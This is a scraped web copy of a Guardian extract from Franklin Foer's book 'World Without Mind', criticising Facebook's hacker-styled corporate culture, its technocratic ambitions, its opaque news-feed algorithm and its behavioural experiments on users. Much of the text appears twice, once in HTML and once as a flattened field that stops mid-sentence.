4.2-.6h.2L3 12h1.6zm-.3-9.2c-.9 0-1.4-.5-1.4-1.3C2.9.5 3.7 0 4.6 0 5.4 0 6 .5 6 1.3c0 1-.8 1.5-1.7 1.5z\"></path><br/></svg> </span> A statue of the mathematician Muhammad ibn Musa al-Khwarizmi in Uzbekistan. Photograph: Alamy<br/></figcaption><br/></figure><p><br/></p><p>There was sleight of hand in this self-portrayal. The algorithm may <br/>be the essence of computer science – but it’s not precisely a scientific<br/> concept. An algorithm is a system, like plumbing or a military chain of<br/> command. It takes knowhow, calculation and creativity to make a system <br/>work properly. But some systems, like some armies, are much more <br/>reliable than others. A system is a human artefact, not a mathematical <br/>truism. The origins of the algorithm are unmistakably human, but human <br/>fallibility isn’t a quality that we associate with it. When algorithms <br/>reject a loan application or set the price for an airline flight, they <br/>seem impersonal and unbending. The algorithm is supposed to be devoid of<br/> bias, intuition, emotion or forgiveness.</p><p><br/></p><p>Silicon Valley’s algorithmic enthusiasts were immodest about <br/>describing the revolutionary potential of their objects of affection. <br/>Algorithms were always interesting and valuable, but advances in <br/>computing made them infinitely more powerful. The big change was the <br/>cost of computing: it collapsed, just as the machines themselves sped up<br/> and were tied into a global network. Computers could stockpile massive <br/>piles of unsorted data – and algorithms could attack this data to find <br/>patterns and connections that would escape human analysts. In the hands <br/>of <a href=\"https://www.theguardian.com/technology/google\" class=\"u-underline in-body-link--immersive\">Google</a> and Facebook, these algorithms grew ever more powerful. As they went <br/>about their searches, they accumulated more and more data. Their <br/>machines assimilated all the lessons of past searches, using these <br/>learnings to more precisely deliver the desired results.</p><p><br/></p><p>For the entirety of human existence, the creation of knowledge was a <br/>slog of trial and error. Humans would dream up theories of how the world<br/> worked, then would examine the evidence to see whether their hypotheses<br/> survived or crashed upon their exposure to reality. Algorithms upend <br/>the scientific method – the patterns emerge from the data, from <br/>correlations, unguided by hypotheses. They remove humans from the whole <br/>process of inquiry. <a href=\"https://www.wired.com/2008/06/pb-theory/\" class=\"u-underline in-body-link--immersive\">Writing in Wired</a>,<br/> Chris Anderson, then editor-in-chief, argued: “We can stop looking for <br/>models. We can analyse the data without hypotheses about what it might <br/>show. We can throw the numbers into the biggest computing clusters the <br/>world has ever seen and let statistical algorithms find patterns where <br/>science cannot.”</p><p><br/></p><p>On one level, this is undeniable. Algorithms can translate languages <br/>without understanding words, simply by uncovering the patterns that <br/>undergird the construction of sentences. They can find coincidences that<br/> humans might never even think to seek. Walmart’s algorithms found that <br/>people <a href=\"http://www.nytimes.com/2004/11/14/business/yourmoney/what-walmart-knows-about-customers-habits.html?mcubz=1&amp;_r=0\" class=\"u-underline in-body-link--immersive\">desperately buy strawberry Pop-Tarts</a> as they prepare for massive storms.</p><p><br/></p><p>Still, even as an algorithm mindlessly implements its procedures – <br/>and even as it learns to see new patterns in the data – it reflects the <br/>minds of its creators, the motives of its trainers. Amazon and Netflix <br/>use algorithms to make recommendations about books and films. (One-third<br/> of purchases on Amazon come from these recommendations.) These <br/>algorithms seek to understand our tastes, and the tastes of like-minded <br/>consumers of culture. Yet the algorithms make fundamentally different <br/>recommendations. Amazon steers you to the sorts of books that you’ve <br/>seen before. Netflix directs users to the unfamiliar. There’s a business<br/> reason for this difference. Blockbuster movies cost <a href=\"https://www.theguardian.com/media/netflix\" class=\"u-underline in-body-link--immersive\">Netflix</a><br/> more to stream. Greater profit arrives when you decide to watch more <br/>obscure fare. Computer scientists have an aphorism that describes how <br/>algorithms relentlessly hunt for patterns: they talk about torturing the<br/> data until it confesses. Yet this metaphor contains unexamined <br/>implications. Data, like victims of torture, tells its interrogator what<br/> it wants to hear.</p><p><br/></p><p>Like economics, computer science has its preferred models and <br/>implicit assumptions about the world. When programmers are taught <br/>algorithmic thinking, they are told to venerate efficiency as a <br/>paramount consideration. This is perfectly understandable. An algorithm <br/>with an ungainly number of steps will gum up the machinery, and a <br/>molasses-like server is a useless one. But efficiency is also a value. <br/>When we speed things up, we’re necessarily cutting corners; we’re <br/>generalising.</p><p><br/></p><p>Algorithms can be gorgeous expressions of logical thinking, not to <br/>mention a source of ease and wonder. They can track down copies of <br/>obscure 19th-century tomes in a few milliseconds; they put us in touch <br/>with long-lost elementary school friends; they enable retailers to <br/>deliver packages to our doors in a flash. Very soon, they will guide <br/>self-driving cars and pinpoint cancers growing in our innards. But to do<br/> all these things, algorithms are constantly taking our measure. They <br/>make decisions about us and on our behalf. The problem is that when we <br/>outsource thinking to machines, we are really outsourcing thinking to <br/>the organisations that run the machines.</p><p><br/></p><hr class=\"section-rule\"/><p><br/></p><p><span class=\"drop-cap\"><span class=\"drop-cap__inner\">M</span></span>ark Zuckerberg disingenuously poses as a friendly critic of algorithms. <br/>That’s how he implicitly contrasts Facebook with his rivals across the <br/>way at Google. Over in <a href=\"https://www.theguardian.com/media/2014/dec/08/google-larry-page-tops-mediaguardian-100-power-list\" class=\"u-underline in-body-link--immersive\">Larry Page</a>’s shop, the algorithm is king – a cold, pulseless ruler. There’s not a <br/>trace of life force in its recommendations, and very little apparent <br/>understanding of the person keying a query into its engine. Facebook, in<br/> his flattering self-portrait, is a respite from this increasingly <br/>automated, atomistic world. “Every product you use is better off with <br/>your friends,” he says.</p><p><br/></p><p>What he is referring to is Facebook’s news feed. Here’s a brief <br/>explanation for the sliver of humanity who have apparently resisted <br/>Facebook: the news feed provides a reverse chronological index of all <br/>the status updates, articles and photos that your friends have posted to<br/> Facebook. The news feed is meant to be fun, but also geared to solve <br/>one of the essential problems of modernity – our inability to sift <br/>through the ever-growing, always-looming mounds of information. Who <br/>better, the theory goes, to recommend what we should read and watch than<br/> our friends? Zuckerberg has boasted that the News Feed turned Facebook <br/>into a “personalised newspaper”.</p><p><br/></p><p>Unfortunately, our friends can do only so much to winnow things for <br/>us. Turns out, they like to share a lot. If we just read their musings <br/>and followed links to articles, we might be only a little less <br/>overwhelmed than before, or perhaps even deeper underwater. So Facebook <br/>makes its own choices about what should be read. The company’s <br/>algorithms sort the thousands of things a Facebook user could possibly <br/>see down to a smaller batch of choice items. And then within those few <br/>dozen items, it decides what we might like to read first.</p><p><br/></p><p>Algorithms are, by definition, invisibilia. But we can usually sense <br/>their presence – that somewhere in the distance, we’re interacting with a<br/> machine. That’s what makes Facebook’s algorithm so powerful. Many users<br/> – 60%, according to the best research – are completely unaware of its <br/>existence. But even if they know of its influence, it wouldn’t really <br/>matter. Facebook’s algorithm couldn’t be more opaque. It has grown into <br/>an almost unknowable tangle of sprawl. The algorithm interprets more <br/>than 100,000 “signals” to make its decisions about what users see. Some <br/>of these signals apply to all Facebook users; some reflect users’ <br/>particular habits and the habits of their friends. Perhaps Facebook no <br/>longer fully understands its own tangle of algorithms – the code, all <br/>60m lines of it, is a palimpsest, where engineers add layer upon layer <br/>of new commands.</p><p><br/></p><p>Pondering the abstraction of this algorithm, imagine one of those <br/>earliest computers with its nervously blinking lights and long rows of <br/>dials. To tweak the algorithm, the engineers turn the knob a click or <br/>two. The engineers are constantly making small adjustments here and <br/>there, so that the machine performs to their satisfaction. With even the<br/> gentlest caress of the metaphorical dial, Facebook changes what its <br/>users see and read. It can make our friends’ photos more or less <br/>ubiquitous; it can punish posts filled with self-congratulatory musings <br/>and banish what it deems to be hoaxes; it can promote video rather than <br/>text; it can favour articles from the likes of the New York Times or <br/>BuzzFeed, if it so desires. Or if we want to be melodramatic about it, <br/>we could say Facebook is constantly tinkering with how its users view <br/>the world – always tinkering with the quality of news and opinion that <br/>it allows to break through the din, adjusting the quality of political <br/>and cultural discourse in order to hold the attention of users for a few<br/> more beats.</p><p><br/></p><p>But how do the engineers know which dial to twist and how hard? <br/>There’s a whole discipline, data science, to guide the writing and <br/>revision of algorithms. Facebook has a team, poached from academia, to <br/>conduct experiments on users. It’s a statistician’s sexiest dream – some<br/> of the largest data sets in human history, the ability to run trials on<br/> mathematically meaningful cohorts. When Cameron Marlow, the former head<br/> of Facebook’s data science team, described the opportunity, he began <br/>twitching with ecstatic joy. “For the first time,” Marlow said, “we have<br/> a microscope that not only lets us examine social behaviour at a very <br/>fine level that we’ve never been able to see before, but allows us to <br/>run experiments that millions of users are exposed to.”</p><p><br/></p><figure class=\"element element-image img--landscape element--showcase  fig--narrow-caption fig--has-shares \" id=\"img-4\"><div class=\"u-responsive-ratio\"><br/><img class=\"gu-image\" alt=\"Facebook’s headquarters in Menlo Park, California.\" src=\"https://i.guim.co.uk/img/media/5751b33336190ed56ba36ef878794dbea1ef4e9d/0_208_5502_3302/master/5502.jpg?w=300&amp;q=55&amp;auto=format&amp;usm=12&amp;fit=max&amp;s=b855c285b3e0a6321646eb0834221799\"/><br/></div>  <figcaption class=\"caption caption--img caption caption--img\"><span class=\"inline-information inline-icon reveal-caption-icon centered-icon rounded-icon\"><svg width=\"6\" height=\"14\" class=\"reveal-caption-icon__svg centered-icon__svg rounded-icon__svg inline-information__svg inline-icon__svg\"><br/><path d=\"M4.6 12l-.4 1.4c-.7.2-1.9.6-3 .6-.7 0-1.2-.2-1.2-.9 0-.2 0-.3.1-.5l2-6.7H.7l.4-1.5 4.2-.6h.2L3 12h1.6zm-.3-9.2c-.9 0-1.4-.5-1.4-1.3C2.9.5 3.7 0 4.6 0 5.4 0 6 .5 6 1.3c0 1-.8 1.5-1.7 1.5z\"></path><br/></svg> </span> Facebook’s headquarters in Menlo Park, California. Photograph: Alamy<br/></figcaption><br/></figure><p><br/></p><p>Facebook likes to boast about the fact of its experimentation more <br/>than the details of the actual experiments themselves. But there are <br/>examples that have escaped the confines of its laboratories. We know, <br/>for example, that <a href=\"https://www.theguardian.com/technology/2014/jun/29/facebook-users-emotions-news-feeds\" class=\"u-underline in-body-link--immersive\">Facebook sought to discover whether emotions are contagious</a>.<br/> To conduct this trial, Facebook attempted to manipulate the mental <br/>state of its users. For one group, Facebook excised the positive words <br/>from the posts in the news feed; for another group, it removed the <br/>negative words. Each group, it concluded, wrote posts that echoed the <br/>mood of the posts it had reworded. This study was roundly condemned as <br/>invasive, but it is not so unusual. As one member of Facebook’s data <br/>science team confessed: “Anyone on that team could run a test. They’re <br/>always trying to alter people’s behaviour.”</p><p><br/></p><p>There’s no doubting the emotional and psychological power possessed <br/>by Facebook – or, at least, Facebook doesn’t doubt it. It has bragged <br/>about how it increased voter turnout (and organ donation) by subtly <br/>amping up the social pressures that compel virtuous behaviour. Facebook <br/>has even touted the results from these experiments in peer-reviewed <br/>journals: “It is possible that more of the 0.60% growth in turnout <br/>between 2006 and 2010 might have been caused by a single message on <br/>Facebook,” said one study <a href=\"http://www.nature.com/nature/journal/v489/n7415/full/nature11421.html?foxtrotcallback=true\" class=\"u-underline in-body-link--immersive\">published in Nature</a><br/> in 2012. No other company has made such claims about its ability to <br/>shape democracy like this – and for good reason. It’s too much power to <br/>entrust to a corporation.</p><p><br/></p><p>The many Facebook experiments add up. The company believes that it <br/>has unlocked social psychology and acquired a deeper understanding of <br/>its users than they possess of themselves. Facebook can predict users’ <br/>race, sexual orientation, relationship status and drug use on the basis <br/>of their “likes” alone. It’s Zuckerberg’s fantasy that this data might <br/>be analysed to uncover the mother of all revelations, “a fundamental <br/>mathematical law underlying human social relationships that governs the <br/>balance of who and what we all care about”. That is, of course, a goal <br/>in the distance. In the meantime, Facebook will keep probing – <br/>constantly testing to see what we crave and what we ignore, a <br/>never-ending campaign to improve Facebook’s capacity to give us the <br/>things that we want and things we don’t even know we want. Whether the <br/>information is true or concocted, authoritative reporting or <br/>conspiratorial opinion, doesn’t really seem to matter much to Facebook. <br/>The crowd gets what it wants and deserves.</p><p><br/></p><hr class=\"section-rule\"/><p><br/></p><p><span class=\"drop-cap\"><span class=\"drop-cap__inner\">T</span></span>he automation of thinking: we’re in the earliest days of this revolution, <br/>of course. But we can see where it’s heading. Algorithms have retired <br/>many of the bureaucratic, clerical duties once performed by humans – and<br/> they will soon begin to replace more creative tasks. At Netflix, <br/>algorithms suggest the genres of movies to commission. Some news wires <br/>use algorithms to write stories about crime, baseball games and <br/>earthquakes – the most rote journalistic tasks. Algorithms have produced<br/> fine art and composed symphonic music, or at least approximations of <br/>them.</p><p><br/></p><p>It’s a terrifying trajectory, especially for those of us in these <br/>lines of work. If algorithms can replicate the process of creativity, <br/>then there’s little reason to nurture human creativity. Why bother with <br/>the tortuous, inefficient process of writing or painting if a computer <br/>can produce something seemingly as good and in a painless flash? Why <br/>nurture the overinflated market for high culture when it could be so <br/>abundant and cheap? No human endeavour has resisted automation, so why <br/>should creative endeavours be any different?</p><p>The engineering mindset has little patience for the fetishisation of </p><p><br/></p><p>words and images, for the mystique of art, for moral complexity or </p><p><br/></p><p>emotional expression. It views humans as data, components of systems, </p><p><br/></p><p>abstractions. That’s why Facebook has so few qualms about performing </p><p><br/></p><p>rampant experiments on its users. The whole effort is to make human </p><p><br/></p><p>beings predictable – to anticipate their behaviour, which makes them </p><p><br/></p><p>easier to manipulate. With this sort of cold-blooded thinking, so </p><p><br/></p><p>divorced from the contingency and mystery of human life, it’s easy to </p><p><br/></p><p>see how long-standing values begin to seem like an annoyance – why a </p><p><br/></p><p>concept such as privacy would carry so little weight in the engineer’s </p><p><br/></p><p>calculus, why the inefficiencies of publishing and journalism seem so </p><p><br/></p><p>imminently disruptable.</p><p></p><p><br/></p><p>Facebook would never put it this way, but algorithms are meant to <br/>erode free will, to relieve humans of the burden of choosing, to nudge <br/>them in the right direction. Algorithms fuel a sense of omnipotence, the<br/> condescending belief that our behaviour can be altered, without our <br/>even being aware of the hand guiding us, in a superior direction. That’s<br/> always been a danger of the engineering mindset, as it moves beyond its<br/> roots in building inanimate stuff and begins to design a more perfect <br/>social world. We are the screws and rivets in the grand design.</p><p><br/></p><p><em>Extracted from World Without Mind: The Existential Threat of Big <br/>Tech by Franklin Foer, out now in the US and published in the UK by <br/>Jonathan Cape on 28 September, priced £18.99.

			"body_p": "All the values that Silicon Valley professes are the values of the 60s. The big tech companies present  themselves as platforms for personal liberation. Everyone has the right to speak their mind on social media, to fulfil their intellectual and democratic potential, to express their individuality. Where television had been a passive medium that rendered citizens inert, Facebook is participatory and empowering. It allows users to read widely, think for themselves and form their own opinions.We can’t entirely dismiss this rhetoric. There are parts of the world, even in the US, where Facebook emboldens citizens and enables them to organise themselves in opposition to power. But we shouldn’t accept Facebook’s self-conception as sincere, either. Facebook is a carefully managed top-down system, not a robust public square. It mimics some of the patterns of conversation, but that’s a surface trait.In reality, Facebook is a tangle of rules and procedures for sorting information, rules devised by the corporation for the ultimate benefit of the corporation. Facebook is always surveilling users, always auditing them, using them as lab rats in its behavioural experiments. While it creates the impression that it offers choice, in truth Facebook paternalistically nudges users in the direction it deems best for them, which also happens to be the direction that gets them thoroughly addicted. It’s a phoniness that is most obvious in the compressed, historic career of Facebook’s mastermind.Mark Zuckerberg is a good boy, but he wanted to be bad, or maybe just a little bit naughty. The heroes of his adolescence were the original hackers. These weren’t malevolent data thieves or cyberterrorists. Zuckerberg’s hacker heroes were disrespectful of authority. They were technically virtuosic, infinitely resourceful nerd cowboys, unbound by conventional thinking. In the labs of the Massachusetts Institute of Technology (MIT) during the 60s and 70s, they broke any rule that interfered with building the stuff of early computing, such marvels as the first video games and word processors. With their free time, they played epic pranks, which happened to draw further attention to their own cleverness – installing a living cow on the roof of a Cambridge dorm; launching a weather balloon, which miraculously emerged from beneath the turf, emblazoned with “MIT”, in the middle of a Harvard-Yale football game.The hackers’ archenemies were the bureaucrats who ran universities, corporations and governments. Bureaucrats talked about making the world more efficient, just like the hackers. But they were really small-minded paper-pushers who fiercely guarded the information they held, even when that information yearned to be shared. When hackers clearly engineered better ways of doing things – a box that enabled free long-distance calls, an instruction that might improve an operating system – the bureaucrats stood in their way, wagging an unbending finger. The hackers took aesthetic and comic pleasure in outwitting the men in suits.When Zuckerberg arrived at Harvard in the fall of 2002, the heyday of the hackers had long passed. They were older guys now, the stuff of good tales, some stuck in twilight struggles against The Man. But Zuckerberg wanted to hack, too, and with that old-time indifference to norms. In high school he picked the lock that prevented outsiders from fiddling with AOL’s code and added his own improvements to its instant messaging program. As a college sophomore he hatched a site called Facemash – with the high-minded purpose of determining the hottest kid on campus. Zuckerberg asked users to compare images of two students and then determine the better-looking of the two. The winner of each pairing advanced to the next round of his hormonal tournament. To cobble this site together, Zuckerberg needed photos. He purloined those from the servers of the various Harvard houses. “One thing is certain,” he wrote on a blog as he put the finishing touches on his creation, “and it’s that I’m a jerk for making this site. Oh well.”His brief experimentation with rebellion ended with his apologising to a Harvard disciplinary panel, as well as to campus women’s groups, and mulling strategies to redeem his soiled reputation. In the years since, he has shown that defiance really wasn’t his natural inclination. His distrust of authority was such that he sought out Don Graham, then the venerable chairman of the Washington Post company, as his mentor. After he started Facebook, he shadowed various giants of corporate America so that he could study their managerial styles up close.Still, Zuckerberg’s juvenile fascination with hackers never died – or rather, he carried it forward into his new, more mature incarnation. When he finally had a corporate campus of his own, he procured a vanity address for it: One Hacker Way. He designed a plaza with the word “HACK” inlaid into the concrete. In the centre of his office park, he created an open meeting space called Hacker Square. This is, of course, the venue where his employees join for all-night Hackathons. As he told a group of would-be entrepreneurs, “We’ve got this whole ethos that we want to build a hacker culture.”Plenty of companies have similarly appropriated hacker culture – hackers are the ur-disrupters – but none have gone as far as Facebook. By the time Zuckerberg began extolling the virtues of hacking, he had stripped the name of most of its original meaning and distilled it into a managerial philosophy that contains barely a hint of rebelliousness. Hackers, he told one interviewer, were “just this group of computer scientists who were trying to quickly prototype and see what was possible. That’s what I try to encourage our engineers to do here.” To hack is to be a good worker, a responsible Facebook citizen – a microcosm of the way in which the company has taken the language of radical individualism and deployed it in the service of conformism.Zuckerberg claimed to have distilled that hacker spirit into a motivational motto: “Move fast and break things.” The truth is that Facebook moved faster than Zuckerberg could ever have imagined. His company was, as we all know, a dorm-room lark, a thing he ginned up in a Red Bull–induced fit of sleeplessness. As his creation grew, it needed to justify its new scale to its investors, to its users, to the world. It needed to grow up fast. Over the span of its short life, the company has caromed from self-description to self-description. It has called itself a tool, a utility and a platform. It has talked about openness and connectedness. And in all these attempts at defining itself, it has managed to clarify its intentions.

Photograph: Rick Friedman/Corbis via GettyThough Facebook will occasionally talk about the transparency of governments and corporations, what it really wants to advance is the transparency of individuals – or what it has called, at various moments, “radical transparency” or “ultimate transparency”. The theory holds that the sunshine of sharing our intimate details will disinfect the moral mess of our lives. With the looming threat that our embarrassing information will be broadcast, we’ll behave better. And perhaps the ubiquity of incriminating photos and damning revelations will prod us to become more tolerant of one another’s sins. “The days of you having a different image for your work friends or co-workers and for the other people you know are probably coming to an end pretty quickly,” Zuckerberg has said. “Having two identities for yourself is an example of a lack of integrity.”The point is that Facebook has a strong, paternalistic view on what’s best for you, and it’s trying to transport you there. “To get people to this point where there’s more openness – that’s a big challenge. But I think we’ll do it,” Zuckerberg has said. He has reason to believe that he will achieve that goal. With its size, Facebook has amassed outsized powers. “In a lot of ways Facebook is more like a government than a traditional company,” Zuckerberg has said. “We have this large community of people, and more than other technology companies we’re really setting policies.”Without knowing it, Zuckerberg is the heir to a long political tradition. Over the last 200 years, the west has been unable to shake an abiding fantasy, a dream sequence in which we throw out the bum politicians and replace them with engineers – rule by slide rule. The French were the first to entertain this notion in the bloody, world-churning aftermath of their revolution. A coterie of the country’s most influential philosophers (notably, Henri de Saint-Simon and Auguste Comte) were genuinely torn about the course of the country. They hated all the old ancient bastions of parasitic power – the feudal lords, the priests and the warriors – but they also feared the chaos of the mob. To split the difference, they proposed a form of technocracy – engineers and assorted technicians would rule with beneficent disinterestedness. Engineers would strip the old order of its power, while governing in the spirit of science. They would impose rationality and order.This dream has captivated intellectuals ever since, especially Americans. The great sociologist Thorstein Veblen was obsessed with installing engineers in power and, in 1921, wrote a book making his case. His vision briefly became a reality. In the aftermath of the first world war, American elites were aghast at all the irrational impulses unleashed by that conflict – the xenophobia, the racism, the urge to lynch and riot. And when the realities of economic life had grown so complicated, how could politicians possibly manage them? Americans of all persuasions began yearning for the salvific ascendance of the most famous engineer of his time: Herbert Hoover. In 1920, Franklin D Roosevelt – who would, of course, go on to replace him in 1932 – organised a movement to draft Hoover for the presidency.The Hoover experiment, in the end, hardly realised the happy fantasies about the Engineer King. A very different version of this dream, however, has come to fruition, in the form of the CEOs of the big tech companies. We’re not ruled by engineers, not yet, but they have become the dominant force in American life – the highest, most influential tier of our elite.There’s another way to describe this historical progression. Automation has come in waves. During the industrial revolution, machinery replaced manual workers. At first, machines required human operators. Over time, machines came to function with hardly any human intervention. For centuries, engineers automated physical labour; our new engineering elite has automated thought. They have perfected technologies that take over intellectual processes, that render the brain redundant. Or, as the former Google and Yahoo executive Marissa Mayer once argued, “You have to make words less human and more a piece of the machine.” Indeed, we have begun to outsource our intellectual work to companies that suggest what we should learn, the topics we should consider, and the items we ought to buy. These companies can justify their incursions into our lives with the very arguments that Saint-Simon and Comte articulated: they are supplying us with efficiency; they are imposing order on human life.Nobody better articulates the modern faith in engineering’s power to transform society than Zuckerberg. He told a group of software developers, “You know, I’m an engineer, and I think a key part of the engineering mindset is this hope and this belief that you can take any system that’s out there and make it much, much better than it is today. Anything, whether it’s hardware or software, a company, a developer ecosystem – you can take anything and make it much, much better.” The world will improve, if only Zuckerberg’s reason can prevail – and it will.The precise source of Facebook’s power is algorithms. That’s a concept repeated dutifully in nearly every story about the tech giants, yet it remains fuzzy at best to users of those sites. From the moment of the algorithm’s invention, it was possible to see its power, its revolutionary potential. The algorithm was developed in order to automate thinking, to remove difficult decisions from the hands of humans, to settle contentious debates.The essence of the algorithm is entirely uncomplicated. The textbooks compare them to recipes – a series of precise steps that can be followed mindlessly. This is different from equations, which have one correct result. Algorithms merely capture the process for solving a problem and say nothing about where those steps ultimately lead.These recipes are the crucial building blocks of software. Programmers can’t simply order a computer to, say, search the internet. They must give the computer a set of specific instructions for accomplishing that task. These instructions must take the messy human activity of looking for information and transpose that into an orderly process that can be expressed in code. First do this … then do that. The process of translation, from concept to procedure to code, is inherently reductive. Complex processes must be subdivided into a series of binary choices. There’s no equation to suggest a dress to wear, but an algorithm could easily be written for that – it will work its way through a series of either/or questions (morning or night, winter or summer, sun or rain), with each choice pushing to the next.For the first decades of computing, the term “algorithm” wasn’t much mentioned. But as computer science departments began sprouting across campuses in the 60s, the term acquired a new cachet. Its vogue was the product of status anxiety. Programmers, especially in the academy, were anxious to show that they weren’t mere technicians. They began to describe their work as algorithmic, in part because it tied them to one of the greatest of all mathematicians – the Persian polymath Muhammad ibn Musa al-Khwarizmi, or as he was known in Latin, Algoritmi. During the 12th century, translations of al-Khwarizmi introduced Arabic numerals to the west; his treatises pioneered algebra and trigonometry. By describing the algorithm as the fundamental element of programming, the computer scientists were attaching themselves to a grand history. It was a savvy piece of name-dropping: See, we’re not arriviste, we’re working with abstractions and theories, just like the mathematicians!    A statue of the mathematician Muhammad ibn Musa al-Khwarizmi in Uzbekistan. Photograph: AlamyThere was sleight of hand in this self-portrayal. The algorithm may be the essence of computer science – but it’s not precisely a scientific concept. An algorithm is a system, like plumbing or a military chain of command. It takes knowhow, calculation and creativity to make a system work properly. But some systems, like some armies, are much more reliable than others. A system is a human artefact, not a mathematical truism. The origins of the algorithm are unmistakably human, but human fallibility isn’t a quality that we associate with it. When algorithms reject a loan application or set the price for an airline flight, they seem impersonal and unbending. The algorithm is supposed to be devoid of bias, intuition, emotion or forgiveness.Silicon Valley’s algorithmic enthusiasts were immodest about describing the revolutionary potential of their objects of affection. Algorithms were always interesting and valuable, but advances in computing made them infinitely more powerful. The big change was the cost of computing: it collapsed, just as the machines themselves sped up and were tied into a global network. Computers could stockpile massive piles of unsorted data – and algorithms could attack this data to find patterns and connections that would escape human analysts. In the hands of Google and Facebook, these algorithms grew ever more powerful. As they went about their searches, they accumulated more and more data. Their machines assimilated all the lessons of past searches, using these learnings to more precisely deliver the desired results.For the entirety of human existence, the creation of knowledge was a slog of trial and error. Humans would dream up theories of how the world worked, then would examine the evidence to see whether their hypotheses survived or crashed upon their exposure to reality. Algorithms upend the scientific method – the patterns emerge from the data, from correlations, unguided by hypotheses. They remove humans from the whole process of inquiry. Writing in Wired, Chris Anderson, then editor-in-chief, argued: “We can stop looking for models. We can analyse the data without hypotheses about what it might show. We can throw the numbers into the biggest computing clusters the world has ever seen and let statistical algorithms find patterns where science cannot.”On one level, this is undeniable. Algorithms can translate languages without understanding words, simply by uncovering the patterns that undergird the construction of sentences. They can find coincidences that humans might never even think to seek. Walmart’s algorithms found that people desperately buy strawberry Pop-Tarts as they prepare for massive storms.Still, even as an algorithm mindlessly implements its procedures – and even as it learns to see new patterns in the data – it reflects the minds of its creators, the motives of its trainers. Amazon and Netflix use algorithms to make recommendations about books and films. (One-third of purchases on Amazon come from these recommendations.) These algorithms seek to understand our tastes, and the tastes of like-minded consumers of culture. Yet the algorithms make fundamentally different recommendations. Amazon steers you to the sorts of books that you’ve seen before. Netflix directs users to the unfamiliar. There’s a business reason for this difference. Blockbuster movies cost Netflix more to stream. Greater profit arrives when you decide to watch more obscure fare. Computer scientists have an aphorism that describes how algorithms relentlessly hunt for patterns: they talk about torturing the data until it confesses. Yet this metaphor contains unexamined implications. Data, like victims of torture, tells its interrogator what it wants to hear.Like economics, computer science has its preferred models and implicit assumptions about the world. When programmers are taught algorithmic thinking, they are told to venerate efficiency as a paramount consideration. This is perfectly understandable. An algorithm with an ungainly number of steps will gum up the machinery, and a molasses-like server is a useless one. But efficiency is also a value. When we speed things up, we’re necessarily cutting corners; we’re generalising.Algorithms can be gorgeous expressions of logical thinking, not to mention a source of ease and wonder. They can track down copies of obscure 19th-century tomes in a few milliseconds; they put us in touch with long-lost elementary school friends; they enable retailers to deliver packages to our doors in a flash. Very soon, they will guide self-driving cars and pinpoint cancers growing in our innards. But to do all these things, algorithms are constantly taking our measure. They make decisions about us and on our behalf. The problem is that when we outsource thinking to machines, we are really outsourcing thinking to the organisations that run the machines.Mark Zuckerberg disingenuously poses as a friendly critic of algorithms. That’s how he implicitly contrasts Facebook with his rivals across the way at Google. Over in Larry Page’s shop, the algorithm is king – a cold, pulseless ruler. There’s not a trace of life force in its recommendations, and very little apparent understanding of the person keying a query into its engine. Facebook, in his flattering self-portrait, is a respite from this increasingly automated, atomistic world. “Every product you use is better off with your friends,” he says.What he is referring to is Facebook’s news feed. Here’s a brief explanation for the sliver of humanity who have apparently resisted Facebook: the news feed provides a reverse chronological index of all the status updates, articles and photos that your friends have posted to Facebook. The news feed is meant to be fun, but also geared to solve one of the essential problems of modernity – our inability to sift through the ever-growing, always-looming mounds of information. Who better, the theory goes, to recommend what we should read and watch than our friends? Zuckerberg has boasted that the News Feed turned Facebook into a “personalised newspaper”.Unfortunately, our friends can do only so much to winnow things for us. Turns out, they like to share a lot. If we just read their musings and followed links to articles, we might be only a little less overwhelmed than before, or perhaps even deeper underwater. So Facebook makes its own choices about what should be read. The company’s algorithms sort the thousands of things a Facebook user could possibly see down to a smaller batch of choice items. And then within those few dozen items, it decides what we might like to read first.Algorithms are, by definition, invisibilia. But we can usually sense their presence – that somewhere in the distance, we’re interacting with a machine. That’s what makes Facebook’s algorithm so powerful. Many users – 60%, according to the best research – are completely unaware of its existence. But even if they know of its influence, it wouldn’t really matter. Facebook’s algorithm couldn’t be more opaque. It has grown into an almost unknowable tangle of sprawl. The algorithm interprets more than 100,000 “signals” to make its decisions about what users see. Some of these signals apply to all Facebook users; some reflect users’ particular habits and the habits of their friends. Perhaps Facebook no longer fully understands its own tangle of algorithms – the code, all 60m lines of it, is a palimpsest, where engineers add layer upon layer of new commands.Pondering the abstraction of this algorithm, imagine one of those earliest computers with its nervously blinking lights and long rows of dials. To tweak the algorithm, the engineers turn the knob a click or two. The engineers are constantly making small adjustments here and there, so that the machine performs to their satisfaction. With even the gentlest caress of the metaphorical dial, Facebook changes what its users see and read. It can make our friends’ photos more or less ubiquitous; it can punish posts filled with self-congratulatory musings and banish what it deems to be hoaxes; it can promote video rather than text; it can favour articles from the likes of the New York Times or BuzzFeed, if it so desires. Or if we want to be melodramatic about it, we could say Facebook is constantly tinkering with how its users view the world – always tinkering with the quality of news and opinion that it allows to break through the din, adjusting the quality of political and cultural discourse in order to hold the attention of users for a few more beats.But how do the engineers know which dial to twist and how hard? There’s a whole discipline, data science, to guide the writing and revision of algorithms. Facebook has a team, poached from academia, to conduct experiments on users. It’s a statistician’s sexiest dream – some of the largest data sets in human history, the ability to run trials on mathematically meaningful cohorts. When Cameron Marlow, the former head of Facebook’s data science team, described the opportunity, he began twitching with ecstatic joy. “For the first time,” Marlow said, “we have a microscope that not only lets us examine social behaviour at a very fine level that we’ve never been able to see before, but allows us to run experiments that millions of users are exposed to.”    Facebook’s headquarters in Menlo Park, California. Photograph: AlamyFacebook likes to boast about the fact of its experimentation more than the details of the actual experiments themselves. But there are examples that have escaped the confines of its laboratories. We know, for example, that Facebook sought to discover whether emotions are contagious. To conduct this trial, Facebook attempted to manipulate the mental state of its users. For one group, Facebook excised the positive words from the posts in the news feed; for another group, it removed the negative words. Each group, it concluded, wrote posts that echoed the mood of the posts it had reworded. This study was roundly condemned as invasive, but it is not so unusual. As one member of Facebook’s data science team confessed: “Anyone on that team could run a test. They’re always trying to alter people’s behaviour.”There’s no doubting the emotional and psychological power possessed by Facebook – or, at least, Facebook doesn’t doubt it. It has bragged about how it increased voter turnout (and organ donation) by subtly amping up the social pressures that compel virtuous behaviour. Facebook has even touted the results from these experiments in peer-reviewed journals: “It is possible that more of the 0.60% growth in turnout between 2006 and 2010 might have been caused by a single message on Facebook,” said one study published in Nature in 2012. No other company has made such claims about its ability to shape democracy like this – and for good reason. It’s too much power to entrust to a corporation.The many Facebook experiments add up. The company believes that it has unlocked social psychology and acquired a deeper understanding of its users than they possess of themselves. Facebook can predict users’ race, sexual orientation, relationship status and drug use on the basis 